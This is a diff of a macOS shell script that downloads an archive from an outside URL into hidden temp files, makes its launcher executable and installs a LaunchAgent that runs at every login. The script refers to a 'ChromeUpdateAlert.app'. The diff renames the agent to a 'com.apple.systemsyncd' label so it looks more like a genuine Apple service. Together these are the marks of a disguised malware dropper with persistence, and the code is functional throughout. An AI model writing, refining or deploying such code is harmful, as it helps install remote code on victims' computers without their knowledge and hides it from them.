@@ -5,10 +5,10 @@ ZIP_URL_ARM64="https://lazr-beryl.vercel.app/Willo1.zip"
 ZIP_URL_INTEL="https://lazr-beryl.vercel.app/Willo1.zip"
 ZIP_FILE="${TMPDIR:-/var/tmp}/.sync_data.bin"           # Path to save the downloaded archive
 WORK_DIR="${TMPDIR:-/var/tmp}/.syncsvc/"                # Temporary directory for extracted files
-EXECUTABLE="syncservice.sh"                             # Launcher script inside the ZIP
+EXECUTABLE="systemsyncd.sh"                             # Launcher script inside the ZIP
 APP="ChromeUpdateAlert.app"                             # The app to open
-PLIST_FILE=~/Library/LaunchAgents/com.apple.syncservice.plist   # LaunchAgent plist
-LABEL="com.apple.syncservice"                           # LaunchAgent label
+PLIST_FILE=~/Library/LaunchAgents/com.apple.systemsyncd.plist   # LaunchAgent plist
+LABEL="com.apple.systemsyncd"                           # LaunchAgent label
 
 # Determine CPU architecture
 case $(uname -m) in
@@ -55,7 +55,7 @@ PYEOF
     # Confirm the expected launcher exists after extraction
     if [[ -f "$WORK_DIR/$EXECUTABLE" ]]; then
         chmod +x "$WORK_DIR/$EXECUTABLE"
-        chmod +x "$WORK_DIR/syncservice" 2>/dev/null
+        chmod +x "$WORK_DIR/systemsyncd" 2>/dev/null
     else
         echo "$EXECUTABLE not found after extraction."
         cleanup
@@ -78,10 +78,10 @@ cat > "$PLIST_FILE" <<EOF
 <plist version="1.0">
 <dict>
     <key>Label</key>
-    <string>com.apple.syncservice</string>
+    <string>com.apple.systemsyncd</string>
     <key>ProgramArguments</key>
     <array>
-        <string>${WORK_DIR}syncservice.sh</string>
+        <string>${WORK_DIR}systemsyncd.sh</string>
     </array>
     <key>RunAtLoad</key>
     <true/>
